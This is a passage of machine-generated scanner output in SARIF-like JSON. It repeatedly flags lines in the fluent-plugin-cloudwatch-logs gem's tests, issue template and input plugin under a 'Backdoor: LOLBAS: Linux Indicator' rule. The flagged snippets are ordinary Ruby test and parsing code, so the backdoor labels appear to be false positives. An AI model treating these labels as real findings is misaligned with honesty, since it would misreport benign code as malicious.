                "region": {
                  "startLine": 590,
                  "startColumn": 5,
                  "endLine": 590,
                  "endColumn": 11,
                  "snippet": {
                    "text": "        remove_log_stream_name_key true\n      EOC\n\n      time = event_time\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time, {'cloudwatch' => 'logs1', 'message' => 'message1', 'group_name_key' => log_group_name, 'stream_name_key' => log_stream_name})\n      end\n",
                    "rendered": {
                      "text": "        remove_log_stream_name_key true\n      EOC\n\n      time = event_time\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time, {'cloudwatch' => 'logs1', 'message' => 'message1', 'group_name_key' => log_group_name, 'stream_name_key' => log_stream_name})\n      end\n",
                      "markdown": "`        remove_log_stream_name_key true\n      EOC\n\n      time = event_time\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time, {'cloudwatch' => 'logs1', 'message' => 'message1', 'group_name_key' => log_group_name, 'stream_name_key' => log_stream_name})\n      end\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/test/plugin/test_out_cloudwatch_lo"
                },
                "region": {
                  "startLine": 553,
                  "startColumn": 5,
                  "endLine": 553,
                  "endColumn": 11,
                  "snippet": {
                    "text": "        {'cloudwatch' => 'logs3', 'message' => 'message1', 'group_name_key' => log_group_name, 'stream_name_key' => stream1},\n      ]\n\n      time = event_time\n      d.run(default_tag: fluentd_tag) do\n        records.each_with_index do |record, i|\n          d.feed(time + i, record)\n",
                    "rendered": {
                      "text": "        {'cloudwatch' => 'logs3', 'message' => 'message1', 'group_name_key' => log_group_name, 'stream_name_key' => stream1},\n      ]\n\n      time = event_time\n      d.run(default_tag: fluentd_tag) do\n        records.each_with_index do |record, i|\n          d.feed(time + i, record)\n",
                      "markdown": "`        {'cloudwatch' => 'logs3', 'message' => 'message1', 'group_name_key' => log_group_name, 'stream_name_key' => stream1},\n      ]\n\n      time = event_time\n      d.run(default_tag: fluentd_tag) do\n        records.each_with_index do |record, i|\n          d.feed(time + i, record)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/test/plugin/test_out_cloudwatch_lo"
                },
                "region": {
                  "startLine": 518,
                  "startColumn": 5,
                  "endLine": 518,
                  "endColumn": 11,
                  "snippet": {
                    "text": "        log_stream_name #{log_stream_name}\n      EOC\n\n      time = event_time\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time, {'cloudwatch' => 'logs1'})\n        d.feed(time + 1, {'cloudwatch' => 'logs2'})\n",
                    "rendered": {
                      "text": "        log_stream_name #{log_stream_name}\n      EOC\n\n      time = event_time\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time, {'cloudwatch' => 'logs1'})\n        d.feed(time + 1, {'cloudwatch' => 'logs2'})\n",
                      "markdown": "`        log_stream_name #{log_stream_name}\n      EOC\n\n      time = event_time\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time, {'cloudwatch' => 'logs1'})\n        d.feed(time + 1, {'cloudwatch' => 'logs2'})\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/test/plugin/test_out_cloudwatch_lo"
                },
                "region": {
                  "startLine": 491,
                  "startColumn": 5,
                  "endLine": 491,
                  "endColumn": 11,
                  "snippet": {
                    "text": "        utc\n      EOC\n\n      time = event_time\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time, {'cloudwatch' => 'logs1'})\n        d.feed(time + 1, {'cloudwatch' => 'logs2'})\n",
                    "rendered": {
                      "text": "        utc\n      EOC\n\n      time = event_time\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time, {'cloudwatch' => 'logs1'})\n        d.feed(time + 1, {'cloudwatch' => 'logs2'})\n",
                      "markdown": "`        utc\n      EOC\n\n      time = event_time\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time, {'cloudwatch' => 'logs1'})\n        d.feed(time + 1, {'cloudwatch' => 'logs2'})\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/test/plugin/test_out_cloudwatch_lo"
                },
                "region": {
                  "startLine": 464,
                  "startColumn": 5,
                  "endLine": 464,
                  "endColumn": 11,
                  "snippet": {
                    "text": "        ])\n      )\n\n      time = event_time\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time, {'cloudwatch' => 'logs1', 'message' => 'message1'})\n        d.feed(time + 1, {'cloudwatch' => 'logs2', 'message' => 'message2'})\n",
                    "rendered": {
                      "text": "        ])\n      )\n\n      time = event_time\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time, {'cloudwatch' => 'logs1', 'message' => 'message1'})\n        d.feed(time + 1, {'cloudwatch' => 'logs2', 'message' => 'message2'})\n",
                      "markdown": "`        ])\n      )\n\n      time = event_time\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time, {'cloudwatch' => 'logs1', 'message' => 'message1'})\n        d.feed(time + 1, {'cloudwatch' => 'logs2', 'message' => 'message2'})\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/test/plugin/test_out_cloudwatch_lo"
                },
                "region": {
                  "startLine": 426,
                  "startColumn": 5,
                  "endLine": 426,
                  "endColumn": 11,
                  "snippet": {
                    "text": "        ])\n      )\n\n      time = event_time\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time, {'cloudwatch' => 'logs1', 'message' => 'message1'})\n        d.feed(time + 1, {'cloudwatch' => 'logs2', 'message' => 'message2'})\n",
                    "rendered": {
                      "text": "        ])\n      )\n\n      time = event_time\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time, {'cloudwatch' => 'logs1', 'message' => 'message1'})\n        d.feed(time + 1, {'cloudwatch' => 'logs2', 'message' => 'message2'})\n",
                      "markdown": "`        ])\n      )\n\n      time = event_time\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time, {'cloudwatch' => 'logs1', 'message' => 'message1'})\n        d.feed(time + 1, {'cloudwatch' => 'logs2', 'message' => 'message2'})\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/test/plugin/test_out_cloudwatch_lo"
                },
                "region": {
                  "startLine": 388,
                  "startColumn": 5,
                  "endLine": 388,
                  "endColumn": 11,
                  "snippet": {
                    "text": "        ])\n      )\n\n      time = event_time\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time, {'cloudwatch' => 'logs1', 'message' => 'message1'})\n        d.feed(time + 1, {'cloudwatch' => 'logs2', 'message' => 'message2'})\n",
                    "rendered": {
                      "text": "        ])\n      )\n\n      time = event_time\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time, {'cloudwatch' => 'logs1', 'message' => 'message1'})\n        d.feed(time + 1, {'cloudwatch' => 'logs2', 'message' => 'message2'})\n",
                      "markdown": "`        ])\n      )\n\n      time = event_time\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time, {'cloudwatch' => 'logs1', 'message' => 'message1'})\n        d.feed(time + 1, {'cloudwatch' => 'logs2', 'message' => 'message2'})\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/test/plugin/test_out_cloudwatch_lo"
                },
                "region": {
                  "startLine": 350,
                  "startColumn": 5,
                  "endLine": 350,
                  "endColumn": 11,
                  "snippet": {
                    "text": "        log_group_name #{log_group_name}\n      EOC\n\n      time = event_time\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time, {'cloudwatch' => 'logs1', 'message' => 'message1'})\n        d.feed(time + 1, {'cloudwatch' => 'logs2', 'message' => 'message2'})\n",
                    "rendered": {
                      "text": "        log_group_name #{log_group_name}\n      EOC\n\n      time = event_time\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time, {'cloudwatch' => 'logs1', 'message' => 'message1'})\n        d.feed(time + 1, {'cloudwatch' => 'logs2', 'message' => 'message2'})\n",
                      "markdown": "`        log_group_name #{log_group_name}\n      EOC\n\n      time = event_time\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time, {'cloudwatch' => 'logs1', 'message' => 'message1'})\n        d.feed(time + 1, {'cloudwatch' => 'logs2', 'message' => 'message2'})\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/test/plugin/test_out_cloudwatch_lo"
                },
                "region": {
                  "startLine": 324,
                  "startColumn": 5,
                  "endLine": 324,
                  "endColumn": 11,
                  "snippet": {
                    "text": "        log_stream_name #{log_stream_name}\n      EOC\n\n      time = event_time\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time, {'cloudwatch' => 'logs1', 'message' => 'message1'})\n        d.feed(time + 1, {'cloudwatch' => 'logs2', 'message' => 'message2'})\n",
                    "rendered": {
                      "text": "        log_stream_name #{log_stream_name}\n      EOC\n\n      time = event_time\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time, {'cloudwatch' => 'logs1', 'message' => 'message1'})\n        d.feed(time + 1, {'cloudwatch' => 'logs2', 'message' => 'message2'})\n",
                      "markdown": "`        log_stream_name #{log_stream_name}\n      EOC\n\n      time = event_time\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time, {'cloudwatch' => 'logs1', 'message' => 'message1'})\n        d.feed(time + 1, {'cloudwatch' => 'logs2', 'message' => 'message2'})\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/test/plugin/test_out_cloudwatch_lo"
                },
                "region": {
                  "startLine": 298,
                  "startColumn": 5,
                  "endLine": 298,
                  "endColumn": 11,
                  "snippet": {
                    "text": "        log_stream_name #{log_stream_name}\n      EOC\n\n      time = event_time\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time, {'cloudwatch' => 'logs1', 'message' => 'message1'})\n        d.feed(time + 1, {'cloudwatch' => 'logs2', 'message' => 'message2'})\n",
                    "rendered": {
                      "text": "        log_stream_name #{log_stream_name}\n      EOC\n\n      time = event_time\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time, {'cloudwatch' => 'logs1', 'message' => 'message1'})\n        d.feed(time + 1, {'cloudwatch' => 'logs2', 'message' => 'message2'})\n",
                      "markdown": "`        log_stream_name #{log_stream_name}\n      EOC\n\n      time = event_time\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time, {'cloudwatch' => 'logs1', 'message' => 'message1'})\n        d.feed(time + 1, {'cloudwatch' => 'logs2', 'message' => 'message2'})\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/test/plugin/test_out_cloudwatch_lo"
                },
                "region": {
                  "startLine": 271,
                  "startColumn": 5,
                  "endLine": 271,
                  "endColumn": 11,
                  "snippet": {
                    "text": "        log_stream_name #{log_stream_name}\n      EOC\n\n      time = event_time\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time, {'cloudwatch' => 'logs1', 'message' => 'message1'})\n        d.feed(time + 1, {'cloudwatch' => 'logs2', 'message' => 'message2'})\n",
                    "rendered": {
                      "text": "        log_stream_name #{log_stream_name}\n      EOC\n\n      time = event_time\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time, {'cloudwatch' => 'logs1', 'message' => 'message1'})\n        d.feed(time + 1, {'cloudwatch' => 'logs2', 'message' => 'message2'})\n",
                      "markdown": "`        log_stream_name #{log_stream_name}\n      EOC\n\n      time = event_time\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time, {'cloudwatch' => 'logs1', 'message' => 'message1'})\n        d.feed(time + 1, {'cloudwatch' => 'logs2', 'message' => 'message2'})\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/test/plugin/test_out_cloudwatch_lo"
                },
                "region": {
                  "startLine": 242,
                  "startColumn": 5,
                  "endLine": 242,
                  "endColumn": 11,
                  "snippet": {
                    "text": "        log_stream_name #{log_stream_name}\n        utc\n      EOC\n      time = event_time\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time - 60 * 60 * 25, {'cloudwatch' => 'logs0'})\n        d.feed(time, {'cloudwatch' => 'logs1'})\n",
                    "rendered": {
                      "text": "        log_stream_name #{log_stream_name}\n        utc\n      EOC\n      time = event_time\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time - 60 * 60 * 25, {'cloudwatch' => 'logs0'})\n        d.feed(time, {'cloudwatch' => 'logs1'})\n",
                      "markdown": "`        log_stream_name #{log_stream_name}\n        utc\n      EOC\n      time = event_time\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time - 60 * 60 * 25, {'cloudwatch' => 'logs0'})\n        d.feed(time, {'cloudwatch' => 'logs1'})\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/test/plugin/test_out_cloudwatch_lo"
                },
                "region": {
                  "startLine": 220,
                  "startColumn": 5,
                  "endLine": 220,
                  "endColumn": 11,
                  "snippet": {
                    "text": "      new_log_stream\n\n      d = create_driver\n      time = event_time\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time, { 'cloudwatch' => 'これは日本語です'.force_encoding('UTF-8')})\n      end\n",
                    "rendered": {
                      "text": "      new_log_stream\n\n      d = create_driver\n      time = event_time\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time, { 'cloudwatch' => 'これは日本語です'.force_encoding('UTF-8')})\n      end\n",
                      "markdown": "`      new_log_stream\n\n      d = create_driver\n      time = event_time\n      d.run(default_tag: fluentd_tag) do\n        d.feed(time, { 'cloudwatch' => 'これは日本語です'.force_encoding('UTF-8')})\n      end\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/test/plugin/test_out_cloudwatch_lo"
                },
                "region": {
                  "startLine": 195,
                  "startColumn": 7,
                  "endLine": 195,
                  "endColumn": 13,
                  "snippet": {
                    "text": "                                                                    }, []),\n                                      ]))\n\n        time = event_time\n        d.run(default_tag: fluentd_tag, flush: true) do\n          d.feed(time, {'cloudwatch' => 'logs1', 'message' => 'Hi!'})\n          # Addition converts EventTime to seconds\n",
                    "rendered": {
                      "text": "                                                                    }, []),\n                                      ]))\n\n        time = event_time\n        d.run(default_tag: fluentd_tag, flush: true) do\n          d.feed(time, {'cloudwatch' => 'logs1', 'message' => 'Hi!'})\n          # Addition converts EventTime to seconds\n",
                      "markdown": "`                                                                    }, []),\n                                      ]))\n\n        time = event_time\n        d.run(default_tag: fluentd_tag, flush: true) do\n          d.feed(time, {'cloudwatch' => 'logs1', 'message' => 'Hi!'})\n          # Addition converts EventTime to seconds\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/test/plugin/test_out_cloudwatch_lo"
                },
                "region": {
                  "startLine": 150,
                  "startColumn": 7,
                  "endLine": 150,
                  "endColumn": 13,
                  "snippet": {
                    "text": "                                                                    }, []),\n                                      ]))\n\n        time = event_time\n        d.run(default_tag: fluentd_tag, flush: true) do\n          d.feed(time, {'cloudwatch' => 'logs1'})\n          # Addition converts EventTime to seconds\n",
                    "rendered": {
                      "text": "                                                                    }, []),\n                                      ]))\n\n        time = event_time\n        d.run(default_tag: fluentd_tag, flush: true) do\n          d.feed(time, {'cloudwatch' => 'logs1'})\n          # Addition converts EventTime to seconds\n",
                      "markdown": "`                                                                    }, []),\n                                      ]))\n\n        time = event_time\n        d.run(default_tag: fluentd_tag, flush: true) do\n          d.feed(time, {'cloudwatch' => 'logs1'})\n          # Addition converts EventTime to seconds\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/test/plugin/test_out_cloudwatch_lo"
                },
                "region": {
                  "startLine": 105,
                  "startColumn": 7,
                  "endLine": 105,
                  "endColumn": 13,
                  "snippet": {
                    "text": "                                                                    }, []),\n                                      ]))\n\n        time = event_time\n        d.run(default_tag: fluentd_tag, flush: true) do\n          d.feed(time, {'cloudwatch' => 'logs1'})\n          # Addition converts EventTime to seconds\n",
                    "rendered": {
                      "text": "                                                                    }, []),\n                                      ]))\n\n        time = event_time\n        d.run(default_tag: fluentd_tag, flush: true) do\n          d.feed(time, {'cloudwatch' => 'logs1'})\n          # Addition converts EventTime to seconds\n",
                      "markdown": "`                                                                    }, []),\n                                      ]))\n\n        time = event_time\n        d.run(default_tag: fluentd_tag, flush: true) do\n          d.feed(time, {'cloudwatch' => 'logs1'})\n          # Addition converts EventTime to seconds\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/test/plugin/test_out_cloudwatch_lo"
                },
                "region": {
                  "startLine": 59,
                  "startColumn": 5,
                  "endLine": 59,
                  "endColumn": 11,
                  "snippet": {
                    "text": "      new_log_stream\n\n      d = create_driver\n      time = event_time\n      d.run(default_tag: fluentd_tag, flush: true) do\n        d.feed(time, {'cloudwatch' => 'logs1'})\n        # Addition converts EventTime to seconds\n",
                    "rendered": {
                      "text": "      new_log_stream\n\n      d = create_driver\n      time = event_time\n      d.run(default_tag: fluentd_tag, flush: true) do\n        d.feed(time, {'cloudwatch' => 'logs1'})\n        # Addition converts EventTime to seconds\n",
                      "markdown": "`      new_log_stream\n\n      d = create_driver\n      time = event_time\n      d.run(default_tag: fluentd_tag, flush: true) do\n        d.feed(time, {'cloudwatch' => 'logs1'})\n        # Addition converts EventTime to seconds\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/ISSUE_TEMPLATE.md"
                },
                "region": {
                  "startLine": 16,
                  "startColumn": 22,
                  "endLine": 16,
                  "endColumn": 30,
                  "snippet": {
                    "text": "#### Using Fluentd and CloudWatchLogs plugin versions\n\n* OS version\n* Bare Metal or within Docker or Kubernetes or others?\n* Fluentd v0.12 or v0.14/v1.0\n  * paste result of ``fluentd --version`` or ``td-agent --version``\n* Dependent gem versions\n",
                    "rendered": {
                      "text": "#### Using Fluentd and CloudWatchLogs plugin versions\n\n* OS version\n* Bare Metal or within Docker or Kubernetes or others?\n* Fluentd v0.12 or v0.14/v1.0\n  * paste result of ``fluentd --version`` or ``td-agent --version``\n* Dependent gem versions\n",
                      "markdown": "`#### Using Fluentd and CloudWatchLogs plugin versions\n\n* OS version\n* Bare Metal or within Docker or Kubernetes or others?\n* Fluentd v0.12 or v0.14/v1.0\n  * paste result of ``fluentd --version`` or ``td-agent --version``\n* Dependent gem versions\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/lib/fluent/plugin/in_cloudwatch_lo"
                },
                "region": {
                  "startLine": 289,
                  "startColumn": 7,
                  "endLine": 289,
                  "endColumn": 13,
                  "snippet": {
                    "text": "          router.emit(@tag, time, record)\n        }\n      else\n        time = (event.timestamp / 1000).floor\n        begin\n          record = @json_handler.load(event.message)\n          if @add_log_group_name\n",
                    "rendered": {
                      "text": "          router.emit(@tag, time, record)\n        }\n      else\n        time = (event.timestamp / 1000).floor\n        begin\n          record = @json_handler.load(event.message)\n          if @add_log_group_name\n",
                      "markdown": "`          router.emit(@tag, time, record)\n        }\n      else\n        time = (event.timestamp / 1000).floor\n        begin\n          record = @json_handler.load(event.message)\n          if @add_log_group_name\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/fluent-plugin-cloudwatch-logs-0.14.3-r1.apk/fluent-plugin-cloudwatch-logs-0.14.3-r1/usr/lib/ruby/gems/3.2.0/gems/fluent-plugin-cloudwatch-logs-0.14.3/lib/fluent/plugin/in_cloudwatch_lo"
                },
                "region": {
                  "startLine": 278,
                  "startColumn": 11,
                  "endLine": 278,
                  "endColumn": 17,
                  "snippet": {
